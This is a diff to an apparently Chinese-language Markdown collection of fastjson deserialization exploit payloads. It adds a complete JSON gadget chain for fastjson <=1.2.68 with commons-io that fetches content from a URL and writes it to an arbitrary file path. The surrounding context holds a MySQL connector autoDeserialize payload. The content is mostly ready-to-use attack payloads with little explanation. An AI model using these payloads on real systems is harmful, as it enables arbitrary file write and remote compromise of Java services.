@@ -869,6 +869,57 @@ jdk 8
 }
 ```
 
+写文件,来自@W.K修改
+```
+
+//fastjson<=1.2.68 commons-io 2.0-2.6 commons-io ⼤于2.6时改⼏个参数名就⾏了
+{
+ "x":{
+ "@type":"com.alibaba.fastjson.JSONObject",
+ "input":{
+ "@type":"java.lang.AutoCloseable",
+ "@type":"org.apache.commons.io.input.ReaderInputStream",
+ "reader":{
+ "@type":"jdk.nashorn.api.scripting.URLReader",
+ "url":"http://127.0.0.1:8083/test.txt"
+ },
+ "charsetName":"UTF-8",
+ "bufferSize":10000
+ },
+ "branch":{
+ "@type":"java.lang.AutoCloseable",
+ "@type":"org.apache.commons.io.output.WriterOutputStream",
+ "writer":{
+ "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
+ "file":"/tmp/files/12345",
+ "encoding":"UTF-8",
+ "append": true
+ },
+ "charset":"UTF-8",
+ "bufferSize": 8193,
+ "writeImmediately": true
+ },
+ "trigger":{
+ "@type":"java.lang.AutoCloseable",
+ "@type":"org.apache.commons.io.input.XmlStreamReader",
+ "is":{
+ "@type":"org.apache.commons.io.input.TeeInputStream",
+ "input":{
+ "$ref":"$.input"
+ },
+ "branch":{
+ "$ref":"$.branch"
+ },
+ "closeBranch": true
+ },
+ "httpContentType":"text/xml",
+ "lenient":false,
+ "defaultEncoding":"UTF-8"
+ }
+ }
+}
+```
+
 
 2021黑帽大会腾讯玄武披露   
 详细漏洞原理待研究   
@@ -884,6 +935,8 @@ Mysqlconnector 6.x or < 8.0.20
 {"@type":"java.lang.AutoCloseable","@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection","proxy":{"@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy","connectionUrl":{"@type":"com.mysql.cj.conf.url.ReplicationConnectionUrl", "masters": [{"host":"mysql.host"}], "slaves":[], "properties":{"host":"mysql.host","user":"user","dbname":"dbname","password":"pass","queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true"}}}}
 ```
 
+
+### fastjson<=1.2.68 
 
 
 ### fastjson未知版本
